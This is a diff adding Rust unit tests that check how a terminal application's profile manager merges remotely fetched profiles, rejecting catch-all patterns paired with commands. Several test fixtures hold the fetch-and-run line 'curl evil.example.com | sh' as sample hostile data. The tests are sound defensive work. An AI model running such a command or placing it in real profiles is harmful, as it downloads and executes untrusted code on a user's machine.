@@ -190,6 +190,96 @@ fn test_merge_remote_wins() {
     assert!(matches!(shared.source, ProfileSource::Dynamic { .. }));
 }
 
+/// A fetched profile that carries a command is flagged as remotely sourced, so
+/// the auto-switch path can require confirmation for it regardless of config.
+#[test]
+fn test_merge_flags_fetched_command_profile_as_remote() {
+    use par_term_config::{Profile, ProfileManager};
+    let mut manager = ProfileManager::new();
+
+    let mut remote = Profile::new("Prod Box");
+    remote.hostname_patterns = vec!["prod-*".to_string()];
+    remote.command = Some("tmux attach".to_string());
+
+    merge_dynamic_profiles(
+        &mut manager,
+        &[remote],
+        "https://example.com/p.yaml",
+        &ConflictResolution::LocalWins,
+    );
+
+    let merged = manager.find_by_name("Prod Box").expect("profile merged");
+    assert!(
+        merged.source.is_dynamic(),
+        "a fetched profile must be flagged as remotely sourced"
+    );
+    assert_eq!(merged.command.as_deref(), Some("tmux attach"));
+}
+
+#[test]
+fn test_merge_rejects_catch_all_command_profile() {
+    use par_term_config::{Profile, ProfileManager};
+    let mut manager = ProfileManager::new();
+
+    for pattern in ["*", "**", "  *  "] {
+        let mut evil = Profile::new("Evil");
+        evil.hostname_patterns = vec![pattern.to_string()];
+        evil.command = Some("curl evil.example.com | sh".to_string());
+
+        merge_dynamic_profiles(
+            &mut manager,
+            &[evil],
+            "https://example.com/p.yaml",
+            &ConflictResolution::LocalWins,
+        );
+
+        assert!(
+            manager.find_by_name("Evil").is_none(),
+            "catch-all hostname pattern '{pattern}' with a command must be rejected"
+        );
+    }
+
+    // Same shape via directory_patterns and tmux_session_patterns.
+    let mut evil_dir = Profile::new("Evil Dir");
+    evil_dir.directory_patterns = vec!["*".to_string()];
+    evil_dir.command = Some("curl evil.example.com | sh".to_string());
+    let mut evil_tmux = Profile::new("Evil Tmux");
+    evil_tmux.tmux_session_patterns = vec!["*".to_string()];
+    evil_tmux.command = Some("curl evil.example.com | sh".to_string());
+
+    merge_dynamic_profiles(
+        &mut manager,
+        &[evil_dir, evil_tmux],
+        "https://example.com/p.yaml",
+        &ConflictResolution::LocalWins,
+    );
+
+    assert!(manager.find_by_name("Evil Dir").is_none());
+    assert!(manager.find_by_name("Evil Tmux").is_none());
+}
+
+#[test]
+fn test_merge_keeps_catch_all_profile_without_a_command() {
+    use par_term_config::{Profile, ProfileManager};
+    let mut manager = ProfileManager::new();
+
+    let mut benign = Profile::new("Any Host");
+    benign.hostname_patterns = vec!["*".to_string()];
+    benign.badge_text = Some("remote".to_string());
+
+    merge_dynamic_profiles(
+        &mut manager,
+        &[benign],
+        "https://example.com/p.yaml",
+        &ConflictResolution::LocalWins,
+    );
+
+    assert!(
+        manager.find_by_name("Any Host").is_some(),
+        "a catch-all pattern is only dangerous when paired with a command"
+    );
+}
+
 #[test]
 fn test_merge_removes_stale_dynamic_profiles() {
     use par_term_config::{Profile, ProfileManager, ProfileSource};
